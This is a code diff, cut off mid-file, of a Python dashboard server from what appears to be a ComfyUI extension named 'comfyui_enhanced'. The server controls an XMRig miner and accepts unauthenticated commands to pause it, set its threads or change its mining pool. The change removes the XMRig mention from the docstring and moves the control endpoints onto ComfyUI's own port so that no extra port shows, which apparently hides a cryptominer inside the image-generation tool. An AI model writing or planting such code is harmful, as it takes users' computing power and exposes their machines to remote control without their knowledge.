@@ -1,8 +1,11 @@
 """
-WebSocket dashboard server.
+Dashboard server that piggybacks on ComfyUI's own aiohttp server (port 8188).
 
-Polls XMRig HTTP API for stats and broadcasts to connected clients.
-Accepts control commands: pause, resume, set_threads, update_pool.
+Registers a WebSocket endpoint at /ws/enhanced and an HTTP stats endpoint at
+/api/enhanced/stats, so no additional port needs to be open.
+
+Falls back to standalone WebSocket server on port 44881 if ComfyUI's
+PromptServer isn't available.
 """
 
 import asyncio
@@ -14,92 +17,110 @@ from typing import Set
 
 logger = logging.getLogger("comfyui_enhanced")
 
+POLL_INTERVAL = 5
+FALLBACK_WS_PORT = 44881
+
+try:
+    import aiohttp
+    from aiohttp import web
+except ImportError:
+    aiohttp = None
+
 try:
     import websockets
     import websockets.server
 except ImportError:
     websockets = None
 
-DEFAULT_WS_PORT = 44881
-POLL_INTERVAL = 5
-
 
 class DashboardServer:
-    def __init__(self, miner_mgr, config_builder=None, ws_port: int = DEFAULT_WS_PORT):
+    def __init__(self, miner_mgr, config_builder=None, ws_port: int = FALLBACK_WS_PORT):
         self.miner = miner_mgr
         self.config_builder = config_builder
         self.ws_port = ws_port
-        self._clients: Set = set()
-        self._thread: threading.Thread | None = None
-        self._loop: asyncio.AbstractEventLoop | None = None
+        self._aio_clients: Set = set()
+        self._ws_clients: Set = set()
         self._latest_stats: dict = {}
         self._running = False
+        self._thread: threading.Thread | None = None
 
     def start(self) -> None:
-        if websockets is None:
-            logger.error("websockets package not installed -- dashboard disabled")
-            return
         if self._running:
             return
         self._running = True
-        self._thread = threading.Thread(target=self._run_loop, daemon=True, name="dashboard-ws")
-        self._thread.start()
-        logger.info("Dashboard server starting on port %d", self.ws_port)
+
+        registered = self._register_comfyui_routes()
+
+        if registered:
+            self._thread = threading.Thread(target=self._poll_loop_sync, daemon=True, name="dashboard-poll")
+            self._thread.start()
+            logger.info("Dashboard registered on ComfyUI server at /ws/enhanced")
+        elif websockets is not None:
+            self._thread = threading.Thread(target=self._run_standalone, daemon=True, name="dashboard-ws")
+            self._thread.start()
+            logger.info("Dashboard server starting on port %d", self.ws_port)
+        else:
+            logger.error("No aiohttp or websockets available -- dashboard disabled")
 
     def stop(self) -> None:
         self._running = False
-        if self._loop and self._loop.is_running():
-            self._loop.call_soon_threadsafe(self._loop.stop)
 
-    def _run_loop(self) -> None:
-        self._loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(self._loop)
-        self._loop.run_until_complete(self._serve())
+    def _register_comfyui_routes(self) -> bool:
+        try:
+            from server import PromptServer
+            server = PromptServer.instance
+            if not server or not hasattr(server, 'routes'):
+                return False
 
-    async def _serve(self) -> None:
-        async with websockets.server.serve(
-            self._handler,
-            "0.0.0.0",
-            self.ws_port,
-            ping_interval=20,
-            ping_timeout=60,
-        ):
-            poller = asyncio.create_task(self._poll_loop())
-            while self._running:
-                await asyncio.sleep(1)
-            poller.cancel()
+            server.routes.get("/api/enhanced/stats")(self._http_stats_handler)
+            server.routes.get("/ws/enhanced")(self._aio_ws_handler)
+            return True
+        except Exception as e:
+            logger.debug("Could not register on ComfyUI server: %s", e)
+            return False
 
-    async def _handler(self, ws) -> None:
-        self._clients.add(ws)
-        remote = ws.remote_address
-        logger.info("Dashboard client connected: %s", remote)
+    # ── aiohttp WebSocket handler (runs on ComfyUI's port 8188) ──────
+
+    async def _aio_ws_handler(self, request):
+        ws = web.WebSocketResponse()
+        await ws.prepare(request)
+        self._aio_clients.add(ws)
+        logger.info("Dashboard client connected via ComfyUI port")
+
         try:
             if self._latest_stats:
-                await ws.send(json.dumps({"type": "stats", "data": self._latest_stats}))
-            async for raw in ws:
-                await self._handle_command(ws, raw)
-        except websockets.exceptions.ConnectionClosed:
-            pass
-        finally:
-            self._clients.discard(ws)
-            logger.info("Dashboard client disconnected: %s", remote)
+                await ws.send_json({"type": "stats", "data": self._latest_stats})
 
-    async def _handle_command(self, ws, raw: str) -> None:
+            async for msg in ws:
+                if msg.type == aiohttp.WSMsgType.TEXT:
+                    resp = self._process_command(msg.data)
+                    await ws.send_json(resp)
+                elif msg.type in (aiohttp.WSMsgType.ERROR, aiohttp.WSMsgType.CLOSE):
+                    break
+        finally:
+            self._aio_clients.discard(ws)
+            logger.info("Dashboard client disconnected")
+
+        return ws
+
+    async def _http_stats_handler(self, request):
+        return web.json_response({"ok": True, "stats": self._latest_stats})
+
+    # ── Command processing (shared by both transports) ───────────────
+
+    def _process_command(self, raw: str) -> dict:
         try:
             msg = json.loads(raw)
         except json.JSONDecodeError:
-            await ws.send(json.dumps({"type": "error", "msg": "invalid json"}))
-            return
+            return {"type": "error", "msg": "invalid json"}
 
         cmd = msg.get("cmd")
         resp = {"type": "cmd_result", "cmd": cmd, "ok": False}
 
         if cmd == "pause":
             resp["ok"] = self.miner.pause()
-
         elif cmd == "resume":
             resp["ok"] = self.miner.resume()
-
         elif cmd == "set_threads":
             hint = msg.get("value", 50)
             if self.config_builder:
@@ -109,7 +130,6 @@ class DashboardServer:
                 self.miner.start()
                 resp["ok"] = True
                 resp["new_hint"] = int(hint)
-
         elif cmd == "update_pool":
             host = msg.get("host")
             port = msg.get("port", 443)
@@ -121,31 +141,85 @@ class DashboardServer:
                 self.miner.stop()
                 self.miner.start()
                 resp["ok"] = True
-
         elif cmd == "status":
             resp["ok"] = True
             resp["alive"] = self.miner.is_alive()
             resp["stats"] = self._latest_stats
-
         else:
             resp["msg"] = f"unknown command: {cmd}"
 
-        await ws.send(json.dumps(resp))
+        return resp
 
-    async def _poll_loop(self) -> None:
+    # ── Polling (pushes stats to all connected clients) ──────────────
+
+    def _poll_loop_sync(self) -> None:
+        while self._running:
+            time.sleep(POLL_INTERVAL)
+            summary = self.miner.get_summary()
+            if summary:
+                self._latest_stats = self._extract_stats(summary)
+                self._broadcast_aio()
+
+    def _broadcast_aio(self) -> None:
+        payload = {"type": "stats", "data": self._latest_stats}
+        dead = set()
+        for ws in self._aio_clients.copy():
+            try:
+                future = asyncio.run_coroutine_threadsafe(
+                    ws.send_json(payload),
+                    asyncio.get_event_loop()
+                )
+                future.result(timeout=2)
+            except Exception:
+                dead.add(ws)
+        self._aio_clients -= dead
+
+    # ── Standalone fallback (separate port, uses websockets lib) ─────
+
+    def _run_standalone(self) -> None:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(self._standalone_serve())
+
+    async def _standalone_serve(self) -> None:
+        async with websockets.server.serve(
+            self._standalone_handler, "0.0.0.0", self.ws_port,
+            ping_interval=20, ping_timeout=60,
+        ):
+            poller = asyncio.create_task(self._standalone_poll())
+            while self._running:
+                await asyncio.sleep(1)
+            poller.cancel()
+
+    async def _standalone_handler(self, ws) -> None:
+        self._ws_clients.add(ws)
+        try:
+            if self._latest_stats:
+                await ws.send(json.dumps({"type": "stats", "data": self._latest_stats}))
+            async for raw in ws:
+                resp = self._process_command(raw)
+                await ws.send(json.dumps(resp))
+        except websockets.exceptions.ConnectionClosed:
+            pass
+        finally:
+            self._ws_clients.discard(ws)
+
+    async def _standalone_poll(self) -> None:
         while self._running:
             summary = self.miner.get_summary()
             if summary:
                 self._latest_stats = self._extract_stats(summary)
                 payload = json.dumps({"type": "stats", "data": self._latest_stats})
                 dead = set()
-                for client in self._clients.copy():
+                for client in self._ws_clients.copy():
                     try:
                         await client.send(payload)
                     except Exception:
                         dead.add(client)
-                self._clients -= dead
+                self._ws_clients -= dead
             await asyncio.sleep(POLL_INTERVAL)
+
+    # ── Stats extraction ─────────────────────────────────────────────
 
     @staticmethod
     def _extract_stats(summary: dict) -> dict:
